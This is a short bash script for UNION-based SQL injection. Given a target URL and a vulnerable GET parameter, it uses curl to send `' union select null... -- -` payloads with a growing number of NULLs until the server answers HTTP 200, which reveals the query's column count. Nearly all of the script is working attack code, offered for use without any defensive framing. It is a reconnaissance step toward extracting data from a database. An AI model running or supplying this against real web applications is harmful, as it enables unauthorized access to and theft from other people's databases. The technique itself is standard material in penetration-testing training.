#!/usr/bin/env bash

#
#   Finding amount of columns in table
#   needed in UNION based SQL injection
#   using NULL statements
#

SUCCESS=0
FAILURE=1

COLOR_RED="\033[31m"
COLOR_GREEN="\033[32m"
COLOR_RESET="\033[0m"

usage() {
    echo "usage: ./$(basename $0) -u URL -p PROXY-URL -v VULN-PARAM" 1>&2
}

exit_failure() {
    usage
    exit $FAILURE
}

make_request() {
    payload="$1"
    if [ -n "$proxy" ]; then
        p="--proxy $proxy"
    fi
    
    code=$(
        curl $p --get --data-urlencode "$payload" -ski $url | 
        grep HTTP | 
        perl -pe 's/HTTP\/\d(\.\d)?\s(\d{3}).*/$2/g'| 
        tail -n 1
    )

    if [[ "$code" == "200" ]]; then
        return $SUCCESS
    else
        return $FAILURE
    fi
}

generate_payload() {
    count=$1
    ((count=count-1))
    nulls=$( printf "%${count}s")
    nulls=${nulls// /", null"}
    echo "' union select null$nulls -- -"
}

while getopts "u:p:v:h" opt; do
    case $opt in
        u)
            url=$OPTARG
            ;;
        p)
            proxy=$OPTARG
            ;;
        v)
            param=$OPTARG
            ;;
        h)
            usage
            exit 0
            ;;
        *)
            exit_failure
            ;;
    esac
done


if [ -z "$url" ]; then
    echo -e "${COLOR_RED}URL is required.${COLOR_RESET}" 1>&2
    exit_failure
fi

if [ -z "$param" ]; then
    echo -e "${COLOR_RED}Vulnerable GET parameter name is required.${COLOR_RESET}" 1>&2
    exit_failure
fi

for ((i=1; ; i++)); do
    if make_request "$param=$(generate_payload $i)"; then
        echo
        echo -e "${COLOR_GREEN}Number of columns in query: $i${COLOR_RESET}"
        exit $SUCCESS
    else
        echo -ne "${COLOR_RED}.${COLOR_RESET}"
    fi
done
